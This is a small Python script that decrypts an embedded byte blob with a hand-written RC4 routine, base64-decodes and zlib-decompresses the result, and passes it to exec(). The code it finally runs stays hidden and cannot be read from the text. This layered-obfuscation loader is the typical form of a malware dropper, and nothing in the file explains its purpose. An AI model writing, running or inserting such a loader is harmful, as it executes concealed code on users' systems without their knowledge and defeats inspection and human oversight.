import base64, zlib
def _ksa(key):
    box = list(range(256))
    index = 0
    for position in range(256):
        index = (index + box[position] + key[position % len(key)]) & 0xFF
        box[position], box[index] = box[index], box[position]
    return box
def _rc4(data, key):
    box = _ksa(key)
    out = bytearray()
    first = second = 0
    for byte in data:
        first = (first + 1) & 0xFF
        second = (second + box[first]) & 0xFF
        box[first], box[second] = box[second], box[first]
        out.append(byte ^ box[(box[first] + box[second]) & 0xFF])
    return bytes(out)
_p = b'K3y!8z\x81\x8b*(\x89\x9ep\xd5\x83l\xd7\r\x03\xc2\xcf_Z\x9e+z4\xd6|\xe8=\x86\x96\xf7H\x05g \x16\xf6\r\xd1\x93O\x19\x83V3\xee+\xd3\xceS\xec\xa5\xeb\xfc9\x84\x9d\x010#\xf0\xa2\xdf\xc7\xfb\xc6S,s\xe27\x9a&\x9b\x8a|Zs\x1fr\xc5\x0eU\xe4A\x980\xc0\xff\x85\x1e\x07Yu~\xedz\x06\xa3\x08\xd3\x1a\x97O\xc5\xfa+\x0b\xd4?\x00+\x8b\x95k\xd2\x02\x1d\xeb\xa1\xb5\xcdpf\x8e\xd7)p\x1c#k\x83O\xc3\r7\x8b\xe9\x98I\xff\xef\x11\x9d\x00rk\xf6\xea\xef\xe1\x17~9\xc1\x82\x90\xa7\x9a\xa7\x1cnO\xbe\xf9\xf2y^T\x82z8j\x10\x07\x12\xdb\xb6,\xdb\xaf\xe4\xe3Y\rd^5\x83\xc9\xe0'
exec(zlib.decompress(base64.b64decode(_rc4(_p[6:], _p[:6]))))
